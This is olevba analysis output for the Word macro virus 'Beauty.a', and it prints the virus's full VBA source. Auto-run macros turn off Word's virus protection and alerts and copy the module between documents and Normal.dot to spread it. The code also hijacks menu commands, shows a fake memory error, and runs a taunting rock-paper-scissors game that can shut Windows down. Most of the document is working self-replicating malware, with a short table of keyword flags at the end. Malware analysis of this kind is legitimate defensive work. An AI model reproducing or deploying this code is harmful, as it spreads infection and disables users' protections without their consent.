olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Beauty.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Beauty.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Beauty.bas 
in file: Virus.MSWord.Beauty.a - OLE stream: 'Macros/VBA/Beauty'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub autoclose()
Dim nor$
Dim fn$
Dim con
Dim c
Dim ca
Dim con1
Dim cc
Dim ca1
On Error Resume Next

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo dlg
nor$ = dlg.Template
fn$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 1)

con = WordBasic.CountAutoTextEntries(0)
If con > 0 Then
   For c = 1 To con
      If WordBasic.[AutoTextName$](c, 0) = "lamo" Then ca = 1
   Next c
End If
If ca <> 1 Then

 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="lamo", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p1", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p2", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p4", Tab:=1

End If
con1 = WordBasic.CountAutoTextEntries(1)
If con1 > 0 Then
  For cc = 1 To con1
     If WordBasic.[AutoTextName$](cc, 1) = "lamo" Then ca1 = 1
  Next cc
End If
If ca1 <> 1 Then
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="lamo", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p1", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p2", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p4", Tab:=1
End If

On Error GoTo exit_
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocumentInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Beauty" Then
            DocumentInstalled = True
        End If
    Next

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "Beauty" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Beauty", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
        
       
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Beauty", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
        
     

End If
Application.DisplayAlerts = wdAlertsAll

If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 Then
WordBasic.Call "game"
End If


exit_:
End Sub

Sub autoopen()
Dim nor$
Dim fn$
Dim con
Dim c
Dim ca
Dim con1
Dim cc
Dim ca1
On Error Resume Next
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo dlg
nor$ = dlg.Template
fn$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 1)

con = WordBasic.CountAutoTextEntries(0)
If con > 0 Then
   For c = 1 To con
      If WordBasic.[AutoTextName$](c, 0) = "lamo" Then ca = 1
   Next c
End If
If ca <> 1 Then

 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="lamo", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p1", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p2", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p4", Tab:=1

End If
con1 = WordBasic.CountAutoTextEntries(1)
If con1 > 0 Then
  For cc = 1 To con1
     If WordBasic.[AutoTextName$](cc, 1) = "lamo" Then ca1 = 1
  Next cc
End If
If ca1 <> 1 Then
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="lamo", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p1", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p2", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p4", Tab:=1
End If

On Error GoTo exit_
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocumentInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Beauty" Then
            DocumentInstalled = True
        End If
    Next

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "Beauty" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Beauty", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
        
       
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Beauty", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
        
     

End If
Application.DisplayAlerts = wdAlertsAll

If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 Then
WordBasic.Call "game"
End If


exit_:

End Sub

Sub autonew()
Dim nor$
Dim fn$
Dim con
Dim c
Dim ca
Dim con1
Dim cc
Dim ca1
On Error Resume Next
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo dlg
nor$ = dlg.Template
fn$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 1)

con = WordBasic.CountAutoTextEntries(0)
If con > 0 Then
   For c = 1 To con
      If WordBasic.[AutoTextName$](c, 0) = "lamo" Then ca = 1
   Next c
End If
If ca <> 1 Then

 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="lamo", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p1", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p2", Tab:=1
 WordBasic.Organizer Copy:=1, Source:=fn$, Destination:=nor$, Name:="p4", Tab:=1

End If
con1 = WordBasic.CountAutoTextEntries(1)
If con1 > 0 Then
  For cc = 1 To con1
     If WordBasic.[AutoTextName$](cc, 1) = "lamo" Then ca1 = 1
  Next cc
End If
If ca1 <> 1 Then
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="lamo", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p1", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p2", Tab:=1
WordBasic.Organizer Copy:=1, Source:=nor$, Destination:=fn$, Name:="p4", Tab:=1
End If

On Error GoTo exit_
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocumentInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Beauty" Then
            DocumentInstalled = True
        End If
    Next

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "Beauty" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Beauty", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
        
       
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Beauty", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
        
     

End If
Application.DisplayAlerts = wdAlertsAll

If WordBasic.Day(WordBasic.Now()) = WordBasic.Int(Rnd() * 30) + 1 Then
WordBasic.Call "game"
End If


exit_:

End Sub

Sub GAME()
Dim R
Dim num
Dim ans
R = 1
WordBasic.BeginDialog 478, 216, "美 女 拳 for Word97"
    WordBasic.Picture 10, 6, 238, 199, "p4", 1, "Picture1"
    WordBasic.Text 266, 8, 194, 13, "嗨 ! 辛 苦 了 ! 和 我 猜 個 拳", "Text1"
    WordBasic.Text 266, 27, 193, 13, "輕 鬆 一 下 吧 !  猜 贏 就 讓 ", "Text2"
    WordBasic.Text 266, 46, 184, 13, "你 看 精 彩 的 !! 猜 輸 了 !!", "Text3"
    WordBasic.Text 266, 65, 190, 13, "放 心 !! 絕 不 會 動 你 寶 貴", "Text4"
    WordBasic.Text 266, 84, 190, 13, "的 電 腦 和 資 料 的 !! 放 心", "Text5"
    WordBasic.Text 266, 103, 190, 13, "玩 吧 !小 心 別 噴 鼻 血 喔 !", "Text6"
    WordBasic.PushButton 268, 122, 195, 21, "那我出剪刀好了!!", "Push1"
    WordBasic.PushButton 268, 151, 195, 21, "那我出石頭好了!!", "Push2"
    WordBasic.PushButton 268, 183, 195, 21, "那我出布好了!!", "Push3"
WordBasic.EndDialog

guessgame:
Dim gdh As Object: Set gdh = WordBasic.CurValues.UserDialog
num = WordBasic.Int(Rnd() * 5) + 1
ans = WordBasic.Dialog.UserDialog(gdh)
If num >= 4 Then
recall
GoTo guessgame

End If
If ans = num Then
WordBasic.MsgBox "可  惡 !! 竟  然  會  輸  給  你  這  個  臭  小  子!!", "美 女 拳 for Word97", 64
GoTo exit_
End If
WordBasic.Beep
WordBasic.MsgBox "遜  斃  了 !! 叫  聲  姑  奶  奶 , 考  慮  讓  你  一  把 !!", "美 女 拳 for Word97", 64
R = R + 1
If R <= 5 Then
GoTo guessgame
End If

WordBasic.MsgBox "沒  見  過  像  你  這  樣  矬  的  人  !!  小  姐  我  不  陪  你  耗  了 !!", "美 女 拳 for Word97", 64
WordBasic.ExitWindows

exit_:
guess1
End Sub

Private Sub guess1()
Dim R
Dim num
Dim ans
R = 1
WordBasic.BeginDialog 478, 216, "美 女 拳 for Word97 "
    WordBasic.Picture 10, 6, 238, 199, "lamo", 1, "Picture1"
    WordBasic.Text 266, 8, 194, 13, "哼!再和我猜個拳吧!", "Text1"
    WordBasic.Text 266, 27, 193, 13, "看你好運到幾時?猜贏了!", "Text2"
    WordBasic.Text 266, 46, 184, 13, "就讓你看更精彩的!!猜輸了!!", "Text3"
    WordBasic.Text 266, 65, 190, 13, "放心!!絕不會傷害你寶貴", "Text4"
    WordBasic.Text 266, 84, 190, 13, "的電腦和資料的!!放心", "Text5"
    WordBasic.Text 266, 103, 190, 13, "玩吧!記得把鼻血擦乾淨喔!", "Text6"
    WordBasic.PushButton 268, 122, 195, 21, "那我出剪刀好了!!", "Push1"
    WordBasic.PushButton 268, 151, 195, 21, "那我出石頭好了!!", "Push2"
    WordBasic.PushButton 268, 183, 195, 21, "那我出布好了!!", "Push3"
WordBasic.EndDialog

guessgame:
Dim gdh As Object: Set gdh = WordBasic.CurValues.UserDialog
num = WordBasic.Int(Rnd() * 5) + 1
ans = WordBasic.Dialog.UserDialog(gdh)
If num >= 5 Then
recall
GoTo guessgame

End If

If ans = num Then
WordBasic.MsgBox "氣  死  人  了 !! 你  的  運  氣  怎  麼  這  麼  好  ?", "美 女 拳 for Word97", 64
GoTo exit_
End If
WordBasic.Beep
WordBasic.MsgBox "回  去  吃  奶  吧 !! 乳  臭  未  乾  的  小  子 !!", "美 女 拳 for Word97", 64
R = R + 1
If R <= 5 Then
GoTo guessgame
End If

WordBasic.MsgBox "天  字  第  一  號  大  白  癡 !!!! 過  來  舔  我  的  腳  趾  頭  吧 !!", "美 女 拳 for Word97", 64
WordBasic.ExitWindows


exit_:
guess2
End Sub

Private Sub guess2()
Dim R
Dim num
Dim ans
R = 1
WordBasic.BeginDialog 478, 216, "美 女 拳 for Word97"
    WordBasic.Picture 10, 6, 238, 199, "p1", 1, "Picture1"
    WordBasic.Text 266, 8, 194, 13, "不簡單!連闖兩關!這回要讓你", "Text1"
    WordBasic.Text 266, 27, 193, 13, "吃不完兜著走!你行嗎???", "Text2"
    WordBasic.Text 266, 46, 184, 13, "你贏的話!還有更精彩的", "Text3"
    WordBasic.Text 266, 65, 190, 13, "揉揉眼睛別瞪著一對死魚眼!", "Text4"
    WordBasic.Text 266, 84, 190, 13, "把掛在嘴角的口水擦乾吧!!", "Text5"
    WordBasic.Text 266, 103, 190, 13, "別裝出一副大白癡的模樣!", "Text6"
    WordBasic.PushButton 268, 122, 195, 21, "那我出剪刀好了!!", "Push1"
    WordBasic.PushButton 268, 151, 195, 21, "那我出石頭好了!!", "Push2"
    WordBasic.PushButton 268, 183, 195, 21, "那我出布好了!!", "Push3"
WordBasic.EndDialog

guessgame:
Dim gdh As Object: Set gdh = WordBasic.CurValues.UserDialog
num = WordBasic.Int(Rnd() * 15) + 1
ans = WordBasic.Dialog.UserDialog(gdh)
If num >= 8 Then
recall
GoTo guessgame

End If

If ans = num Then
WordBasic.MsgBox "喂 !! 你  有  作  弊  的  嫌  疑  喔 !!", "美 女 拳 for Word97", 64
GoTo exit_
End If
WordBasic.Beep
WordBasic.MsgBox "喂 !! 你  在  睡  覺  ㄚ ????", "美 女 拳 for Word97", 64
R = R + 1
If R <= 5 Then
GoTo guessgame
End If

WordBasic.MsgBox "癩  蝦  蟆  想  吃  天  鵝  肉  !! 還  早  著  呢  !! 一  邊  涼  快  去 !!", "美 女 拳 for Word97", 64
WordBasic.ExitWindows

exit_:
guess3
End Sub

Private Sub guess3()
Dim num
Dim ans
WordBasic.BeginDialog 478, 216, "美 女 拳 for Word97"
    WordBasic.Picture 10, 6, 238, 199, "p2", 1, "Picture1"
    WordBasic.Text 266, 8, 194, 13, "嗨!一路過關斬將!辛苦了! ", "Text1"
    WordBasic.Text 266, 27, 193, 13, "輕鬆一下!", "Text2"
    WordBasic.Text 266, 46, 184, 13, "準備看精彩的吧!!", "Text3"
    WordBasic.Text 266, 65, 190, 13, "放心!!絕不會動你寶貴", "Text4"
    WordBasic.Text 266, 84, 190, 13, "的電腦和資料的!!放心看吧!", "Text5"
    WordBasic.Text 266, 103, 190, 13, "小心別把鼻血噴得到處都是!", "Text6"
    WordBasic.PushButton 268, 122, 195, 21, "那我出剪刀好了!!", "Push1"
    WordBasic.PushButton 268, 151, 195, 21, "那我出石頭好了!!", "Push2"
    WordBasic.PushButton 268, 183, 195, 21, "那我出布好了!!", "Push3"
WordBasic.EndDialog

guessgame:
Dim gdh As Object: Set gdh = WordBasic.CurValues.UserDialog
num = WordBasic.Int(Rnd() * 10) + 1
ans = WordBasic.Dialog.UserDialog(gdh)
If num >= 6 Then
recall
GoTo guessgame

End If

If ans = num Then
WordBasic.MsgBox "討  厭  啦  !! 剛  才  那  一  拳  不  算  啦  !!", "美 女 拳 for Word97", 64
GoTo exit_
End If
WordBasic.Beep
WordBasic.MsgBox "ㄟ !! 我  贏  了 !! 好  棒  喔  !! 這  叫  實  力  !! 懂  不  懂  ㄚ??", "美 女 拳 for Word97", 64
GoTo guessgame



exit_:
WordBasic.FileNewDefault
WordBasic.CenterPara
WordBasic.FormatFont Points:=64, Underline:=1, Color:=6, Bold:=1
WordBasic.Insert "我發現一 隻大豬哥了耶 !! 在哪裡....?在哪裡.......? 不就正在電腦螢幕前嗎??"
WordBasic.DocClose 1
WordBasic.ExitWindows

End Sub

Private Sub recall()
WordBasic.Beep
WordBasic.MsgBox "搞  什  麼  嘛 ! 竟  然  平  手 ! 再  猜  一  拳  吧 !! ", "美 女 拳 for Word97", 64

End Sub
Sub FileTemplates()
Dim k
'1997.09.08 by gdh
k = WordBasic.Int(Rnd() * 10)
If k >= 8 Then
WordBasic.Call "game"
GoTo bye
End If

exit_:
WordBasic.Beep
WordBasic.MsgBox " 記 憶 體 用 完 ", "Microsoft Visual Basic", 48

bye:

End Sub
Sub ToolsMacro()
Dim k
'1997.09.08 by gdh
k = WordBasic.Int(Rnd() * 10)
If k >= 8 Then
WordBasic.Call "game"
GoTo bye
End If

exit_:
WordBasic.Beep
WordBasic.MsgBox " 記 憶 體 用 完 ", "Microsoft Visual Basic", 48

bye:

End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|AutoExec  |autonew             |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

